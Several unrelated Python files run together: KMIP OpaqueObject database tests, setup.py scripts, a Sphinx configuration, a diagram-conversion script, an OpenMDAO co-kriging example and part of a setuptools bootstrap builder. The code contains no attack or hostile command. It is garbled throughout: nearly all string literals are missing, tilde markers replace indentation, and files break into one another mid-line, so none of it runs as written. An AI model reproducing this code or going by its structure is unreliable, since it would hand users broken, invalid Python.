~~ def test_get_object_type ( self ) : \n 
~~~ """\n        Test that the object type can be retrieved from the OpaqueObject.\n        """ \n 
expected = enums . ObjectType . OPAQUE_DATA \n 
obj = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
observed = obj . object_type \n 
self . assertEqual ( expected , observed ) \n 
\n 
~~ def test_validate_on_invalid_value ( self ) : \n 
~~~ """\n        Test that a TypeError is raised when an invalid value is used to\n        construct a OpaqueObject.\n        """ \n 
args = ( 0 , enums . OpaqueDataType . NONE ) \n 
self . assertRaises ( TypeError , OpaqueObject , * args ) \n 
\n 
~~ def test_validate_on_invalid_data_type ( self ) : \n 
~~~ """\n        Test that a TypeError is raised when an invalid data type is used to\n        construct a OpaqueObject.\n        """ \n 
args = ( self . bytes_a , ) \n 
self . assertRaises ( TypeError , OpaqueObject , * args ) \n 
\n 
~~ def test_validate_on_invalid_name ( self ) : \n 
~~~ """\n        Test that a TypeError is raised when an invalid name value is used to\n        construct a OpaqueObject.\n        """ \n 
args = ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
kwargs = { : 0 } \n 
self . assertRaises ( TypeError , OpaqueObject , * args , ** kwargs ) \n 
\n 
~~ def test_repr ( self ) : \n 
~~~ """\n        Test that repr can be applied to a OpaqueObject.\n        """ \n 
obj = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
args = "value={0}, opaque_type={1}" . format ( \n 
binascii . hexlify ( self . bytes_a ) , enums . OpaqueDataType . NONE ) \n 
expected = "OpaqueObject({0})" . format ( args ) \n 
observed = repr ( obj ) \n 
self . assertEqual ( expected , observed ) \n 
\n 
~~ def test_str ( self ) : \n 
~~~ """\n        Test that str can be applied to a OpaqueObject.\n        """ \n 
obj = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
expected = str ( binascii . hexlify ( self . bytes_a ) ) \n 
observed = str ( obj ) \n 
self . assertEqual ( expected , observed ) \n 
\n 
~~ def test_equal_on_equal ( self ) : \n 
~~~ """\n        Test that the equality operator returns True when comparing two\n        OpaqueObject objects with the same data.\n        """ \n 
a = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
b = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
self . assertTrue ( a == b ) \n 
self . assertTrue ( b == a ) \n 
\n 
~~ def test_equal_on_not_equal_value ( self ) : \n 
~~~ """\n        Test that the equality operator returns False when comparing two\n        OpaqueObject objects with different data.\n        """ \n 
a = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
b = OpaqueObject ( self . bytes_b , enums . OpaqueDataType . NONE ) \n 
self . assertFalse ( a == b ) \n 
self . assertFalse ( b == a ) \n 
\n 
~~ def test_equal_on_not_equal_data_type ( self ) : \n 
~~~ """\n        Test that the equality operator returns False when comparing two\n        OpaqueObject objects with different data.\n        """ \n 
a = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
b = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
b . opaque_type = "invalid" \n 
self . assertFalse ( a == b ) \n 
self . assertFalse ( b == a ) \n 
\n 
~~ def test_equal_on_type_mismatch ( self ) : \n 
~~~ """\n        Test that the equality operator returns False when comparing a\n        OpaqueObject object to a non-OpaqueObject object.\n        """ \n 
a = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
b = "invalid" \n 
self . assertFalse ( a == b ) \n 
self . assertFalse ( b == a ) \n 
\n 
~~ def test_not_equal_on_equal ( self ) : \n 
~~~ """\n        Test that the inequality operator returns False when comparing\n        two OpaqueObject objects with the same internal data.\n        """ \n 
a = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
b = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
self . assertFalse ( a != b ) \n 
self . assertFalse ( b != a ) \n 
\n 
~~ def test_not_equal_on_not_equal_value ( self ) : \n 
~~~ """\n        Test that the equality operator returns True when comparing two\n        OpaqueObject objects with different data.\n        """ \n 
a = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
b = OpaqueObject ( self . bytes_b , enums . OpaqueDataType . NONE ) \n 
self . assertTrue ( a != b ) \n 
self . assertTrue ( b != a ) \n 
\n 
~~ def test_not_equal_on_not_equal_data_type ( self ) : \n 
~~~ """\n        Test that the equality operator returns True when comparing two\n        OpaqueObject objects with different data.\n        """ \n 
a = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
b = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
b . opaque_type = "invalid" \n 
self . assertTrue ( a != b ) \n 
self . assertTrue ( b != a ) \n 
\n 
~~ def test_not_equal_on_type_mismatch ( self ) : \n 
~~~ """\n        Test that the equality operator returns True when comparing a\n        OpaqueObject object to a non-OpaqueObject object.\n        """ \n 
a = OpaqueObject ( self . bytes_a , enums . OpaqueDataType . NONE ) \n 
b = "invalid" \n 
self . assertTrue ( a != b ) \n 
self . assertTrue ( b != a ) \n 
\n 
~~ def test_save ( self ) : \n 
~~~ """\n        Test that the object can be saved using SQLAlchemy. This will add it to\n        the database, verify that no exceptions are thrown, and check that its\n        unique identifier was set.\n        """ \n 
obj = OpaqueObject ( \n 
self . bytes_a , enums . OpaqueDataType . NONE ) \n 
Session = sessionmaker ( bind = self . engine ) \n 
session = Session ( ) \n 
session . add ( obj ) \n 
session . commit ( ) \n 
\n 
~~ def test_get ( self ) : \n 
~~~ """\n        Test that the object can be saved and then retrieved using SQLAlchemy.\n        This adds is to the database and then retrieves it by ID and verifies\n        some of the attributes.\n        """ \n 
test_name = \n 
obj = OpaqueObject ( \n 
self . bytes_a , enums . OpaqueDataType . NONE , name = test_name ) \n 
Session = sessionmaker ( bind = self . engine ) \n 
session = Session ( ) \n 
session . add ( obj ) \n 
session . commit ( ) \n 
\n 
session = Session ( ) \n 
get_obj = session . query ( OpaqueObject ) . filter ( \n 
ManagedObject . unique_identifier == obj . unique_identifier \n 
) . one ( ) \n 
session . commit ( ) \n 
self . assertEqual ( 1 , len ( get_obj . names ) ) \n 
self . assertEqual ( [ test_name ] , get_obj . names ) \n 
self . assertEqual ( self . bytes_a , get_obj . value ) \n 
self . assertEqual ( enums . ObjectType . OPAQUE_DATA , get_obj . object_type ) \n 
self . assertEqual ( enums . OpaqueDataType . NONE , get_obj . opaque_type ) \n 
\n 
~~ def test_add_multiple_names ( self ) : \n 
~~~ """\n        Test that multiple names can be added to a managed object. This\n        verifies a few properties. First this verifies that names can be added\n        using simple strings. It also verifies that the index for each\n        subsequent string is set accordingly. Finally this tests that the names\n        can be saved and retrieved from the database.\n        """ \n 
expected_names = [ , , ] \n 
obj = OpaqueObject ( \n 
self . bytes_a , enums . OpaqueDataType . NONE , name = expected_names [ 0 ] ) \n 
obj . names . append ( expected_names [ 1 ] ) \n 
obj . names . append ( expected_names [ 2 ] ) \n 
self . assertEquals ( 3 , obj . name_index ) \n 
expected_mo_names = list ( ) \n 
for i , name in enumerate ( expected_names ) : \n 
~~~ expected_mo_names . append ( sqltypes . ManagedObjectName ( name , i ) ) \n 
~~ self . assertEquals ( expected_mo_names , obj . _names ) \n 
\n 
Session = sessionmaker ( bind = self . engine ) \n 
session = Session ( ) \n 
session . add ( obj ) \n 
session . commit ( ) \n 
\n 
session = Session ( ) \n 
get_obj = session . query ( OpaqueObject ) . filter ( \n 
ManagedObject . unique_identifier == obj . unique_identifier \n 
) . one ( ) \n 
session . commit ( ) \n 
self . assertEquals ( expected_mo_names , get_obj . _names ) \n 
\n 
~~ def test_remove_name ( self ) : \n 
~~~ """\n        Tests that a name can be removed from the list of names. This will\n        verify that the list of names is correct. It will verify that updating\n        this object removes the name from the database.\n        """ \n 
names = [ , , ] \n 
remove_index = 1 \n 
obj = OpaqueObject ( \n 
self . bytes_a , enums . OpaqueDataType . NONE , name = names [ 0 ] ) \n 
obj . names . append ( names [ 1 ] ) \n 
obj . names . append ( names [ 2 ] ) \n 
obj . names . pop ( remove_index ) \n 
self . assertEquals ( 3 , obj . name_index ) \n 
\n 
expected_names = list ( ) \n 
expected_mo_names = list ( ) \n 
for i , name in enumerate ( names ) : \n 
~~~ if i != remove_index : \n 
~~~ expected_names . append ( name ) \n 
expected_mo_names . append ( sqltypes . ManagedObjectName ( name , i ) ) \n 
~~ ~~ self . assertEquals ( expected_names , obj . names ) \n 
self . assertEquals ( expected_mo_names , obj . _names ) \n 
\n 
Session = sessionmaker ( bind = self . engine ) \n 
session = Session ( ) \n 
session . add ( obj ) \n 
session . commit ( ) \n 
\n 
session = Session ( ) \n 
get_obj = session . query ( OpaqueObject ) . filter ( \n 
ManagedObject . unique_identifier == obj . unique_identifier \n 
) . one ( ) \n 
session . commit ( ) \n 
self . assertEquals ( expected_names , get_obj . names ) \n 
self . assertEquals ( expected_mo_names , get_obj . _names ) \n 
\n 
~~ def test_remove_and_add_name ( self ) : \n 
~~~ """\n        Tests that names can be removed from the list of names and more added.\n        This will verify that the list of names is correct. It will verify that\n        updating this object removes the name from the database. It will verify\n        that the indices for the removed names are not reused.\n        """ \n 
names = [ , , ] \n 
obj = OpaqueObject ( \n 
self . bytes_a , enums . OpaqueDataType . NONE , name = names [ 0 ] ) \n 
obj . names . append ( names [ 1 ] ) \n 
obj . names . append ( names [ 2 ] ) \n 
obj . names . pop ( ) \n 
obj . names . pop ( ) \n 
obj . names . append ( ) \n 
self . assertEquals ( 4 , obj . name_index ) \n 
\n 
expected_names = [ , ] \n 
expected_mo_names = list ( ) \n 
expected_mo_names . append ( sqltypes . ManagedObjectName ( expected_names [ 0 ] , \n 
0 ) ) \n 
expected_mo_names . append ( sqltypes . ManagedObjectName ( expected_names [ 1 ] , \n 
3 ) ) \n 
self . assertEquals ( expected_names , obj . names ) \n 
self . assertEquals ( expected_mo_names , obj . _names ) \n 
\n 
Session = sessionmaker ( bind = self . engine ) \n 
session = Session ( ) \n 
session . add ( obj ) \n 
session . commit ( ) \n 
\n 
session = Session ( ) \n 
get_obj = session . query ( OpaqueObject ) . filter ( \n 
ManagedObject . unique_identifier == obj . unique_identifier \n 
) . one ( ) \n 
session . commit ( ) \n 
self . assertEquals ( expected_names , get_obj . names ) \n 
self . assertEquals ( expected_mo_names , get_obj . _names ) \n 
\n 
~~ def test_update_with_add_name ( self ) : \n 
~~~ """\n        Tests that an OpaqueObject already stored in the database can be\n        updated. This will store an OpaqueObject in the database. It will add a\n        name to it in one session, and then retrieve it in another session to\n        verify that it has all of the correct names.\n\n        This test and the subsequent test_udpate_* methods are different than\n        the name tests above because these are updating objects already stored\n        in the database. This tests will simulate what happens when the KMIP\n        client calls an add attribute method.\n        """ \n 
first_name = \n 
obj = OpaqueObject ( \n 
self . bytes_a , enums . OpaqueDataType . NONE , name = first_name ) \n 
Session = sessionmaker ( bind = self . engine ) \n 
session = Session ( ) \n 
session . add ( obj ) \n 
session . commit ( ) \n 
\n 
added_name = \n 
expected_names = [ first_name , added_name ] \n 
expected_mo_names = list ( ) \n 
for i , name in enumerate ( expected_names ) : \n 
~~~ expected_mo_names . append ( sqltypes . ManagedObjectName ( name , i ) ) \n 
\n 
~~ session = Session ( ) \n 
update_obj = session . query ( OpaqueObject ) . filter ( \n 
ManagedObject . unique_identifier == obj . unique_identifier \n 
) . one ( ) \n 
update_obj . names . append ( added_name ) \n 
session . commit ( ) \n 
\n 
session = Session ( ) \n 
get_obj = session . query ( OpaqueObject ) . filter ( \n 
ManagedObject . unique_identifier == obj . unique_identifier \n 
) . one ( ) \n 
session . commit ( ) \n 
self . assertEquals ( expected_names , get_obj . names ) \n 
self . assertEquals ( expected_mo_names , get_obj . _names ) \n 
\n 
~~ def test_update_with_remove_name ( self ) : \n 
~~~ """\n        Tests that an OpaqueObject already stored in the database can be\n        updated. This will store an OpaqueObject in the database. It will\n        remove a name from it in one session, and then retrieve it in another\n        session to verify that it has all of the correct names.\n        """ \n 
names = [ , , ] \n 
remove_index = 1 \n 
obj = OpaqueObject ( \n 
self . bytes_a , enums . OpaqueDataType . NONE , name = names [ 0 ] ) \n 
obj . names . append ( names [ 1 ] ) \n 
obj . names . append ( names [ 2 ] ) \n 
\n 
Session = sessionmaker ( bind = self . engine ) \n 
session = Session ( ) \n 
session . add ( obj ) \n 
session . commit ( ) \n 
\n 
expected_names = list ( ) \n 
expected_mo_names = list ( ) \n 
for i , name in enumerate ( names ) : \n 
~~~ if i != remove_index : \n 
~~~ expected_names . append ( name ) \n 
expected_mo_names . append ( sqltypes . ManagedObjectName ( name , i ) ) \n 
\n 
~~ ~~ session = Session ( ) \n 
update_obj = session . query ( OpaqueObject ) . filter ( \n 
ManagedObject . unique_identifier == obj . unique_identifier \n 
) . one ( ) \n 
update_obj . names . pop ( remove_index ) \n 
session . commit ( ) \n 
\n 
session = Session ( ) \n 
get_obj = session . query ( OpaqueObject ) . filter ( \n 
ManagedObject . unique_identifier == obj . unique_identifier \n 
) . one ( ) \n 
session . commit ( ) \n 
self . assertEquals ( expected_names , get_obj . names ) \n 
self . assertEquals ( expected_mo_names , get_obj . _names ) \n 
\n 
~~ def test_update_with_remove_and_add_name ( self ) : \n 
~~~ """\n        Tests that an OpaqueObject already stored in the database can be\n        updated. This will store an OpaqueObject in the database. It will\n        remove a name and add another one to it in one session, and then\n        retrieve it in another session to verify that it has all of the correct\n        names. This simulates multiple operation being sent for the same\n        object.\n        """ \n 
names = [ , , ] \n 
obj = OpaqueObject ( \n 
self . bytes_a , enums . OpaqueDataType . NONE , name = names [ 0 ] ) \n 
obj . names . append ( names [ 1 ] ) \n 
obj . names . append ( names [ 2 ] ) \n 
\n 
Session = sessionmaker ( bind = self . engine ) \n 
session = Session ( ) \n 
session . add ( obj ) \n 
session . commit ( ) \n 
\n 
session = Session ( ) \n 
update_obj = session . query ( OpaqueObject ) . filter ( \n 
ManagedObject . unique_identifier == obj . unique_identifier \n 
) . one ( ) \n 
update_obj . names . pop ( ) \n 
update_obj . names . pop ( ) \n 
update_obj . names . append ( ) \n 
session . commit ( ) \n 
\n 
expected_names = [ , ] \n 
expected_mo_names = list ( ) \n 
expected_mo_names . append ( sqltypes . ManagedObjectName ( expected_names [ 0 ] , \n 
0 ) ) \n 
expected_mo_names . append ( sqltypes . ManagedObjectName ( expected_names [ 1 ] , \n 
3 ) ) \n 
\n 
session = Session ( ) \n 
get_obj = session . query ( OpaqueObject ) . filter ( \n 
ManagedObject . unique_identifier == obj . unique_identifier \n 
) . one ( ) \n 
session . commit ( ) \n 
self . assertEquals ( expected_names , get_obj . names ) \n 
self . assertEquals ( expected_mo_names , get_obj . _names ) \n 
# \n 
# This file is autogenerated during plugin quickstart and overwritten during \n 
# plugin makedist. DO NOT CHANGE IT if you plan to use plugin makedist to update  \n 
# the distribution. \n 
# \n 
\n 
~~ ~~ from setuptools import setup , find_packages \n 
\n 
kwargs = { : , \n 
: , \n 
: [ , \n 
] , \n 
: , \n 
: , \n 
: : True , \n 
: [ ] , \n 
: [ ] , \n 
: , \n 
: , \n 
: , \n 
: , \n 
: { : [ , \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
] } , \n 
: { : } , \n 
: [ , ] , \n 
: , \n 
: , \n 
: False } \n 
\n 
\n 
setup ( ** kwargs ) \n 
\n 
import os . path \n 
import setuptools \n 
import sys \n 
\n 
from numpy . distutils . core import setup \n 
from numpy . distutils . misc_util import Configuration \n 
\n 
include_dirs = [ ] \n 
library_dirs = [ ] \n 
if sys . platform == : \n 
# Update the ``library_dir_option`` function in MSVCCompiler \n 
# to add quotes around /LIBPATH entries. \n 
~~~ import types \n 
def _lib_dir_option ( self , dir ) : \n 
~~~ return \'/LIBPATH:"%s"\' % dir \n 
\n 
~~ from distutils . msvc9compiler import MSVCCompiler \n 
setattr ( MSVCCompiler , , \n 
types . MethodType ( _lib_dir_option , None , MSVCCompiler ) ) \n 
\n 
sdkdir = os . environ . get ( ) \n 
if sdkdir : \n 
~~~ include_dirs . append ( os . path . join ( sdkdir , ) ) \n 
library_dirs . append ( os . path . join ( sdkdir , ) ) \n 
# make sure we have mt.exe available in case we need it \n 
path = os . environ [ ] . split ( ) \n 
path . append ( os . path . join ( sdkdir , ) ) \n 
os . environ [ ] = . join ( path ) \n 
\n 
~~ ~~ config = Configuration ( name = ) \n 
config . add_extension ( , \n 
sources = [ , \n 
] , \n 
include_dirs = include_dirs , \n 
library_dirs = library_dirs ) \n 
config . add_data_files ( , ) \n 
\n 
kwds = { : [ ] , \n 
: , \n 
: False , \n 
: , \n 
\n 
# in the metadata. Go figure. \n 
: , \n 
: { : [ ] } , \n 
} \n 
kwds . update ( config . todict ( ) ) \n 
\n 
setup ( ** kwds ) \n 
\n 
\n 
# This file is autogenerated during plugin quickstart and overwritten during \n 
# plugin makedist. DO NOT CHANGE IT if you plan to use plugin makedist to package \n 
# distribution. \n 
\n 
# -*- coding: utf-8 -*- \n 
# \n 
# This file is execfile()d with the current directory set to its containing dir. \n 
# \n 
\n 
\n 
# \n 
\n 
import sys , os \n 
\n 
# General configuration \n 
# --------------------- \n 
\n 
# Add any Sphinx extension module names here, as strings. They can be extensions \n 
\n 
extensions = [ , , \n 
, , , \n 
\n 
] \n 
\n 
# Add any paths that contain templates here, relative to this directory. \n 
templates_path = [ ] \n 
\n 
# The suffix of source filenames. \n 
source_suffix = \n 
\n 
# The encoding of source files. \n 
\n 
\n 
# The master toctree document. \n 
master_doc = \n 
\n 
# General information about the project. \n 
project = \n 
copyright = \n 
\n 
\n 
# |version| and |release|, also used in various other places throughout the \n 
# built documents. \n 
# \n 
# The short X.Y version. \n 
version = \n 
#The short version is the one that shows up in the file when you use /version/. \n 
# The full version, including alpha/beta/rc tags. \n 
release = \n 
\n 
# The language for content autogenerated by Sphinx. Refer to documentation \n 
# for a list of supported languages. \n 
#language = None \n 
\n 
# There are two options for replacing |today|: either, you set today to some \n 
# non-false value, then it is used: \n 
\n 
# Else, today_fmt is used as the format for a strftime call. \n 
today_fmt = \n 
\n 
\n 
# for source files. \n 
exclude_trees = [ ] \n 
\n 
# The name of the Pygments (syntax highlighting) style to use. \n 
pygments_style = \n 
\n 
\n 
# Options for HTML output \n 
# ----------------------- \n 
\n 
# The style sheet to use for HTML and HTML Help pages. A file of that name \n 
\n 
# given in html_static_path. \n 
html_style = \n 
\n 
# The name for this set of Sphinx documents.  If None, it defaults to \n 
# "<project> v<release> documentation". \n 
#html_title = None \n 
\n 
# A shorter title for the navigation bar.  Default is the same as html_title. \n 
#html_short_title = None \n 
\n 
# The name of an image file (relative to this directory) to place at the top \n 
# of the sidebar. \n 
#html_logo = None \n 
\n 
# The name of an image file (within the static path) to use as favicon of the \n 
# docs.  This file should be a Windows icon file (.ico) being 16x16 or 32x32 \n 
# pixels large. \n 
#html_favicon = None \n 
\n 
# Add any paths that contain custom static files (such as style sheets) here, \n 
# relative to this directory. They are copied after the builtin static files, \n 
# so a file named "default.css" will overwrite the builtin "default.css". \n 
\n 
\n 
\n 
# using the given strftime format. \n 
html_last_updated_fmt = \n 
\n 
# If false, no index is generated. \n 
#html_use_index = True \n 
\n 
# If true, the index is split into individual pages for each letter. \n 
#html_split_index = False \n 
\n 
# If true, the reST sources are included in the HTML build as _sources/<name>. \n 
#html_copy_source = True \n 
\n 
# If true, an OpenSearch description file will be output, and all pages will \n 
# contain a <link> tag referring to it.  The value of this option must be the \n 
# base URL from which the finished HTML is served. \n 
\n 
\n 
html_theme = "default" \n 
\n 
# using these theme options will make the docs share a consistent \n 
# look with the OpenMDAO docs \n 
html_theme_options = { \n 
"headtextcolor" : "darkred" , \n 
"headbgcolor" : "gainsboro" , \n 
"headfont" : "Arial" , \n 
"relbarbgcolor" : "black" , \n 
"relbartextcolor" : "white" , \n 
"relbarlinkcolor" : "white" , \n 
"sidebarbgcolor" : "gainsboro" , \n 
"sidebartextcolor" : "darkred" , \n 
"sidebarlinkcolor" : "black" , \n 
"footerbgcolor" : "gainsboro" , \n 
"footertextcolor" : "darkred" , \n 
"textcolor" : "black" , \n 
"codebgcolor" : "#FFFFCC" , \n 
"linkcolor" : "darkred" , \n 
"codebgcolor" : "#ffffcc" , \n 
} \n 
\n 
todo_include_todos = True \n 
\n 
# Example configuration for intersphinx: refer to the Python standard library. \n 
intersphinx_mapping = { : None } \n 
\n 
autodoc_member_order = \n 
\n 
#!/usr/local/bin/python \n 
\n 
# This script will build .png versions of all of our Dia diagrams that \n 
# have changed since the last time they were built. \n 
\n 
import glob \n 
import os . path \n 
from dirwalk import includingWalk \n 
from os import system \n 
from subprocess import Popen , PIPE , STDOUT \n 
from compmodtimes import compmodtimes \n 
\n 
from PIL import Image \n 
\n 
def resize_image ( fname , max_width = 620 ) : \n 
~~~ im = Image . open ( fname ) \n 
width , height = tuple ( im . getbbox ( ) [ 2 : ] ) \n 
print , height , , width \n 
if width > max_width : \n 
~~~ wrat = max_width / float ( width ) \n 
new_w = int ( width * wrat ) \n 
new_h = int ( height * wrat ) \n 
newim = im . transform ( ( new_w , new_h ) , Image . EXTENT , \n 
im . getbbox ( ) , Image . BICUBIC ) \n 
newim . save ( fname ) \n 
\n 
#Convert dia files to png, and resize \n 
~~ ~~ for diafile in includingWalk ( ".." , [ "*.dia" ] ) : \n 
~~~ pth = os . path . split ( diafile ) \n 
dest = pth [ 1 ] . split ( ) [ 0 ] \n 
retcode = compmodtimes ( diafile , + dest + ) \n 
if retcode == - 1 or retcode == 0 : \n 
~~~ print + dest + \n 
~~ else : \n 
~~~ cmd = + dest + + diafile \n 
system ( cmd ) \n 
resize_image ( os . path . abspath ( os . path . join ( , dest + ) ) ) \n 
\n 
#Copy over any static images to the build area also  \n 
#for staticpic in includingWalk("images", ["*.png"]): \n 
#   stp = os.path.split(staticpic) \n 
#   justname = stp[1] \n 
\n 
#   system(cmd2) \n 
\n 
\n 
~~ ~~ """\nCokriging example from [Forrester 2007] to show\nMultiFiMetaModel and MultiFiCoKrigingSurrogate usage\n""" \n 
\n 
import numpy as np \n 
\n 
from openmdao . main . api import Assembly , Component \n 
\n 
from openmdao . lib . datatypes . api import Float \n 
from openmdao . lib . drivers . api import CaseIteratorDriver \n 
from openmdao . lib . components . api import MultiFiMetaModel \n 
from openmdao . lib . surrogatemodels . api import MultiFiCoKrigingSurrogate , KrigingSurrogate \n 
\n 
\n 
class Model ( Component ) : \n 
~~~ x = Float ( 0 , iotype = "in" ) \n 
f_x = Float ( 0.0 , iotype = "out" ) \n 
\n 
def execute ( self ) : \n 
~~~ x = self . x \n 
self . f_x = ( ( 6 * x - 2 ) ** 2 ) * np . sin ( ( 6 * x - 2 ) * 2 ) \n 
\n 
\n 
~~ ~~ class LowFidelityModel ( Component ) : \n 
~~~ x = Float ( 0.0 , iotype = "in" ) \n 
f_x = Float ( 0.0 , iotype = "out" ) \n 
\n 
def execute ( self ) : \n 
~~~ x = self . x \n 
self . f_x = 0.5 * ( ( 6 * x - 2 ) ** 2 ) * np . sin ( ( 6 * x - 2 ) * 2 ) + ( x - 0.5 ) * 10. - 5 \n 
\n 
\n 
~~ ~~ class HighFidelityModel ( Model ) : \n 
~~~ pass \n 
\n 
\n 
~~ class CasesBuilder ( Assembly ) : \n 
\n 
~~~ def __init__ ( self , model , cases ) : \n 
~~~ self . instance = model \n 
self . cases = cases \n 
super ( CasesBuilder , self ) . __init__ ( ) \n 
\n 
~~ def configure ( self ) : \n 
~~~ self . add ( "model" , self . instance ) \n 
self . add ( "driver" , CaseIteratorDriver ( ) ) \n 
\n 
self . driver . workflow . add ( ) \n 
self . driver . add_parameter ( "model.x" , low = 0 , high = 1 ) \n 
self . driver . add_response ( "model.f_x" ) \n 
self . driver . case_inputs . model . x = self . cases \n 
\n 
self . create_passthrough ( ) \n 
self . create_passthrough ( ) \n 
\n 
\n 
~~ ~~ class Simulation ( Assembly ) : \n 
\n 
~~~ def __init__ ( self , surrogate , nfi = 1 ) : \n 
~~~ self . surrogate = surrogate \n 
self . nfi = nfi \n 
super ( Simulation , self ) . __init__ ( ) \n 
\n 
~~ def configure ( self ) : \n 
\n 
# Expensive and Cheap DOE (note: have to be nested) \n 
~~~ doe_e = [ 0.0 , 0.4 , 0.6 , 1.0 ] \n 
doe_c = [ 0.1 , 0.2 , 0.3 , 0.5 , 0.7 , 0.8 , 0.9 ] + doe_e \n 
self . add ( , CasesBuilder ( HighFidelityModel ( ) , doe_e ) ) \n 
self . add ( , CasesBuilder ( LowFidelityModel ( ) , doe_c ) ) \n 
\n 
# MetaModel \n 
self . add ( "meta_model" , MultiFiMetaModel ( params = ( , ) , \n 
responses = ( , ) , nfi = self . nfi ) ) \n 
self . meta_model . default_surrogate = self . surrogate \n 
self . connect ( , ) \n 
self . connect ( , ) \n 
if self . nfi > 1 : \n 
~~~ self . connect ( , ) \n 
self . connect ( , ) \n 
\n 
# Iteration Hierarchy \n 
\n 
~~ self . add ( , CaseIteratorDriver ( ) ) \n 
self . add ( , Model ( ) ) \n 
self . mm_checker . add_parameter ( "meta_model.x" , low = 0 , high = 1 ) \n 
self . mm_checker . add_parameter ( "model.x" , low = 0 , high = 1 ) \n 
self . mm_checker . add_response ( "model.f_x" ) \n 
self . mm_checker . add_response ( "meta_model.f_x" ) \n 
ngrid = 100 \n 
self . mm_checker . case_inputs . meta_model . x = np . linspace ( 0 , 1 , ngrid ) \n 
self . mm_checker . case_inputs . model . x = np . linspace ( 0 , 1 , ngrid ) \n 
\n 
self . driver . workflow . add ( ) \n 
if self . nfi > 1 : \n 
~~~ self . driver . workflow . add ( ) \n 
~~ self . driver . workflow . add ( ) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
\n 
~~~ surrogate = MultiFiCoKrigingSurrogate ( ) \n 
\n 
# Co-kriging with 2 levels of fidelity     \n 
sim_cok = Simulation ( surrogate , nfi = 2 ) \n 
sim_cok . run ( ) \n 
\n 
predicted_cok = np . array ( [ d . mu for d in sim_cok . mm_checker . case_outputs . meta_model . f_x ] ) \n 
sigma_cok = np . array ( [ d . sigma for d in sim_cok . mm_checker . case_outputs . meta_model . f_x ] ) \n 
\n 
# Co-kriging with 1 level of fidelity a.k.a. kriging    \n 
surrogate = KrigingSurrogate ( ) # uncomment to use the existing Kriging implementation \n 
sim_k = Simulation ( surrogate , nfi = 1 ) \n 
sim_k . run ( ) \n 
\n 
predicted_k = np . array ( [ d . mu for d in sim_k . mm_checker . case_outputs . meta_model . f_x ] ) \n 
sigma_k = np . array ( [ d . sigma for d in sim_k . mm_checker . case_outputs . meta_model . f_x ] ) \n 
\n 
actual = sim_k . mm_checker . case_outputs . model . f_x \n 
check = sim_k . mm_checker . case_inputs . meta_model . x \n 
\n 
import pylab as plt \n 
\n 
plt . figure ( 2 ) \n 
plt . ioff ( ) \n 
plt . plot ( check , actual , , label = ) \n 
plt . plot ( sim_cok . hifi_cases . x , sim_cok . hifi_cases . f_x , , label = "High Fi" ) \n 
plt . plot ( sim_cok . lofi_cases . x , sim_cok . lofi_cases . f_x , , label = "Low Fi" ) \n 
plt . plot ( check , predicted_cok , , label = ) \n 
plt . plot ( check , predicted_cok + 2 * sigma_cok , , alpha = 0.5 , label = ) \n 
plt . plot ( check , predicted_cok - 2 * sigma_cok , , alpha = 0.5 ) \n 
plt . fill_between ( check , predicted_cok + 2 * sigma_cok , \n 
predicted_cok - 2 * sigma_cok , facecolor = , alpha = 0.2 ) \n 
plt . plot ( check , predicted_k , , label = ) \n 
plt . plot ( check , predicted_k + 2 * sigma_k , , alpha = 0.5 , label = ) \n 
plt . plot ( check , predicted_k - 2 * sigma_k , , alpha = 0.5 ) \n 
plt . fill_between ( check , predicted_k + 2 * sigma_k , \n 
predicted_k - 2 * sigma_k , facecolor = , alpha = 0.2 ) \n 
\n 
plt . legend ( loc = ) \n 
plt . show ( ) \n 
\n 
# RMSE CoKriging \n 
error = 0. \n 
for a , p in zip ( actual , predicted_cok ) : \n 
~~~ error += ( a - p ) ** 2 \n 
~~ error = ( error / len ( actual ) ) \n 
print "RMSE Cokriging = %g" % error \n 
\n 
# RMSE Kriging \n 
error = 0. \n 
for a , p in zip ( actual , predicted_k ) : \n 
~~~ error += ( a - p ) ** 2 \n 
~~ error = ( error / len ( actual ) ) \n 
print "RMSE Kriging = %g" % error """\nThis module builds a binary distribution from the specified source directory.\n""" \n 
\n 
~~ import sys \n 
import os \n 
import shutil \n 
import urllib2 \n 
import subprocess \n 
import codecs \n 
from optparse import OptionParser \n 
\n 
\n 
def has_setuptools ( ) : \n 
~~~ try : \n 
~~~ import setuptools \n 
~~ except ImportError : \n 
~~~ return False \n 
~~ return True \n 
\n 
\n 
~~ def make_new_setupfile ( setupfile ) : \n 
~~~ """If setuptools is not installed, make a new setup file that will\n    bootstrap and use setuptools. The new file will be in the same location\n    as setupfile and will have \'_new_\' prepended to the name.\n    """ \n 
setupfile = os . path . abspath ( setupfile ) \n 
newsetupfile = os . path . join ( os . path . dirname ( setupfile ) , \n 
+ os . path . basename ( setupfile ) ) \n 
\n 
startdir = os . getcwd ( ) \n 
\n 
os . chdir ( os . path . dirname ( setupfile ) ) \n 
\n 
try : \n 
~~~ print "setuptools is not installed." \n 
if not os . path . isfile ( ) : \n 
~~~ print "Attempting to download ez_setup.py" \n 
resp = urllib2 . urlopen ( ) \n 
with open ( , ) as easyf : \n 
